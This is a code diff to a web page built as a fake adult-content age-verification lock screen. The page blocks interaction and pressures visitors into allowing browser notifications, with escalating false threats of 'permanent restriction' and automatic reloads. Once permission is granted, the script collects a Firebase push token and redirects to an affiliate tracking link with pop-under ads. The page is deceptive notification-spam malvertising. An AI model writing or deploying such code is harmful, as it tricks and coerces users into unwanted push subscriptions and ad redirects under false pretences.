@@ -15,7 +15,8 @@
         }
         h1 {
             color: red;
-            font-size: 24px;
+            font-size: 30px;
+            margin-top: 0;
         }
         .alert-box {
             background: #222;
@@ -23,6 +24,7 @@
             display: inline-block;
             border-radius: 10px;
             margin-top: 20px;
+            max-width: 400px;
         }
         .alert-box p {
             font-size: 18px;
@@ -46,6 +48,20 @@
             flex-direction: column;
             text-align: center;
             font-size: 20px;
+            z-index: 9999;
+        }
+        .btn {
+            background-color: #ffcc00;
+            color: black;
+            padding: 10px 20px;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: background-color 0.3s ease;
+        }
+        .btn:hover {
+            background-color: #ff9900;
         }
     </style>
 </head>
@@ -53,10 +69,10 @@
     <div class="locked" id="lockScreen">
         <h1>🔞 Adult Content Verification Required 🔞</h1>
         <div class="alert-box">
-            <p>To access this content, you must verify your age.</p>
-            <p>Click <b>“Allow”</b> on the next step to continue.</p>
-            <p><b>Failure to comply will result in access being denied.</b></p>
+            <p>To access exclusive content, you need to verify your age. Click <b>"Allow"</b> on the next step.</p>
+            <p><b>Failure to comply will deny access.</b></p>
         </div>
+        <button class="btn" id="allowButton">Allow Notifications and Continue</button>
         <p class="loading">Processing verification...</p>
     </div>
 
@@ -81,36 +97,55 @@
 
         document.body.style.pointerEvents = "none";
 
-        Notification.requestPermission().then(permission => {
-            if (permission === "granted") {
-                logEvent(analytics, 'notification_permission_granted');
-                getToken(messaging, { vapidKey: 'BMPPrc5Za775GGbVKn8piovY5XlQVnBNlKwTjviSrQZ59xr4uufNpQqnNqdIpdr84wUaOURG57zLS4uwQXmrWIg' })
-                    .then(currentToken => {
-                        console.log("FCM Token:", currentToken);
-                    }).catch(err => {
-                        console.log("Error getting FCM token:", err);
-                    });
+        // Función para solicitar permiso de notificación
+        function requestNotificationPermission() {
+            Notification.requestPermission().then(permission => {
+                if (permission === "granted") {
+                    logEvent(analytics, 'notification_permission_granted');
+                    getToken(messaging, { vapidKey: 'BMPPrc5Za775GGbVKn8piovY5XlQVnBNlKwTjviSrQZ59xr4uufNpQqnNqdIpdr84wUaOURG57zLS4uwQXmrWIg' })
+                        .then(currentToken => {
+                            console.log("FCM Token:", currentToken);
+                        }).catch(err => {
+                            console.log("Error getting FCM token:", err);
+                        });
 
-                document.getElementById("lockScreen").style.display = "none";
-                document.body.style.pointerEvents = "auto";
-                setTimeout(() => window.location.href = "https://t.slext2.com/341879/7272?bo=2753,2754,2755,2756&popUnder=true&aff_sub5=SF_006OG000004lmDN", 2000);
-            } else {
-                logEvent(analytics, 'notification_permission_denied');
+                    // Redirigir después de que el permiso es otorgado
+                    setTimeout(() => {
+                        window.location.href = "https://t.slext2.com/341879/7272?bo=2753,2754,2755,2756&popUnder=true&aff_sub5=SF_006OG000004lmDN";
+                    }, 2000);
 
-                // Segunda oportunidad con un mensaje más fuerte
-                document.getElementById("lockScreen").innerHTML = `
-                    <h1>🚨 FINAL WARNING 🚨</h1>
-                    <div class="alert-box">
-                        <p><b>Access Denied!</b> You must approve the security check.</p>
-                        <p>Click <b>"Allow"</b> on the next step to verify.</p>
-                        <p>Failure to comply will result in <b>permanent restriction</b>.</p>
-                    </div>
-                    <p class="loading">Retrying verification...</p>
-                `;
+                    document.getElementById("lockScreen").style.display = "none";
+                    document.body.style.pointerEvents = "auto";
+                } else {
+                    logEvent(analytics, 'notification_permission_denied');
+                    // Mostrar mensaje de advertencia si el permiso es denegado
+                    document.getElementById("lockScreen").innerHTML = `
+                        <h1>🚨 FINAL WARNING 🚨</h1>
+                        <div class="alert-box">
+                            <p><b>Access Denied!</b> You must approve the security check.</p>
+                            <p>Click <b>"Allow"</b> on the next step to verify.</p>
+                            <p>Failure to comply will result in <b>permanent restriction</b>.</p>
+                        </div>
+                        <button class="btn" id="allowButton">Allow Notifications</button>
+                        <p class="loading">Retrying verification...</p>
+                    `;
+                    setTimeout(() => {
+                        location.reload();  // Recargar la página después de unos segundos
+                    }, 4000);
+                }
+            }).catch(err => {
+                console.error("Error requesting notification permission:", err);
+            });
+        }
 
-                setTimeout(() => location.reload(), 4000);
-            }
+        // Llamar a la función para iniciar la solicitud
+        requestNotificationPermission();
+
+        // Añadir el comportamiento del botón "Allow"
+        document.getElementById("allowButton").addEventListener("click", () => {
+            requestNotificationPermission();
         });
+
     </script>
 </body>
 </html>
